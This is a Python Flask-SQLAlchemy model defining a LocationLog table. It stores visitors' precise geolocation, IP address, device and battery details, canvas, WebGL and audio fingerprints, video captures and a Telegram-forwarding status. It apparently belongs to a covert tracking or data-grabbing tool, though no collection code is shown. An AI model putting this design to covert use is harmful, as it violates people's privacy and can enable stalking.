from app import db
from datetime import datetime

class LocationLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Location data
    latitude = db.Column(db.Float)
    longitude = db.Column(db.Float)
    accuracy = db.Column(db.Float)
    altitude = db.Column(db.Float)
    altitude_accuracy = db.Column(db.Float)
    heading = db.Column(db.Float)
    speed = db.Column(db.Float)
    location_timestamp = db.Column(db.BigInteger)
    
    # Network and IP data
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    country = db.Column(db.String(100))
    city = db.Column(db.String(100))
    region = db.Column(db.String(100))
    isp = db.Column(db.String(200))
    
    # Device information
    platform = db.Column(db.String(100))
    language = db.Column(db.String(20))
    timezone = db.Column(db.String(50))
    screen_width = db.Column(db.Integer)
    screen_height = db.Column(db.Integer)
    color_depth = db.Column(db.Integer)
    pixel_depth = db.Column(db.Integer)
    viewport_width = db.Column(db.Integer)
    viewport_height = db.Column(db.Integer)
    
    # Advanced device info
    cookie_enabled = db.Column(db.Boolean)
    online_status = db.Column(db.Boolean)
    hardware_concurrency = db.Column(db.Integer)
    max_touch_points = db.Column(db.Integer)
    do_not_track = db.Column(db.String(10))
    device_memory = db.Column(db.Float)
    
    # Connection info
    connection_type = db.Column(db.String(50))
    connection_downlink = db.Column(db.Float)
    connection_rtt = db.Column(db.Integer)
    connection_save_data = db.Column(db.Boolean)
    
    # Battery info
    battery_level = db.Column(db.Float)
    battery_charging = db.Column(db.Boolean)
    battery_charging_time = db.Column(db.Float)
    battery_discharging_time = db.Column(db.Float)
    
    # Fingerprinting data
    canvas_fingerprint = db.Column(db.Text)
    webgl_vendor = db.Column(db.String(200))
    webgl_renderer = db.Column(db.String(200))
    webgl_version = db.Column(db.String(100))
    webgl_shading_language_version = db.Column(db.String(100))
    audio_fingerprint = db.Column(db.Text)
    
    # Video data
    has_video = db.Column(db.Boolean, default=False)
    video_size = db.Column(db.Integer)
    
    # Telegram status
    telegram_sent = db.Column(db.Boolean, default=False)
    error_message = db.Column(db.Text)
    
    def __repr__(self):
        return f'<LocationLog {self.id}: {self.latitude}, {self.longitude}>'